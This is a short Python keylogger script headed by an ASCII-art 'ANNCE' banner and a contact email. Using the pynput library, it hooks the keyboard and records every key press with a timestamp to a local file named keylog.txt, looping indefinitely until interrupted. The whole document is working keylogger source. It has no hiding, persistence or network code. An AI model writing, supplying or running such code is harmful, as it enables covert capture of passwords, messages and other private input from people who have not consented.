
print(
"""
       d8888 888b    888 888b    888  .d8888b.  8888888888 
      d88888 8888b   888 8888b   888 d88P  Y88b 888        
     d88P888 88888b  888 88888b  888 888    888 888        
    d88P 888 888Y88b 888 888Y88b 888 888        8888888    
   d88P  888 888 Y88b888 888 Y88b888 888        888        
  d88P   888 888  Y88888 888  Y88888 888    888 888        
 d8888888888 888   Y8888 888   Y8888 Y88b  d88P 888        
d88P     888 888    Y888 888    Y888  "Y8888P"  8888888888 

                            ping me: annieflorance01@gmail.com
""")                         

import logging
from pynput import keyboard
import sys
import signal
import time

# Create a logger
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a function to handle keyboard events
def on_key_press(key):
    # Get the current timestamp
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    # Write the key press event to the log file
    logging.info(f"{timestamp} - Key pressed: {key}")

# Define a function to handle keyboard interrupts
def signal_handler(sig, frame):
    print("\n I Love Black Widow, ANNCE!")
    sys.exit(0)

# Set the keyboard hook
listener = keyboard.Listener(on_press=on_key_press)

# Start the keyboard hook
listener.start()

# Set the signal handler
signal.signal(signal.SIGINT, signal_handler)

# Keep the keyboard hook running indefinitely
while True:
    time.sleep(1)
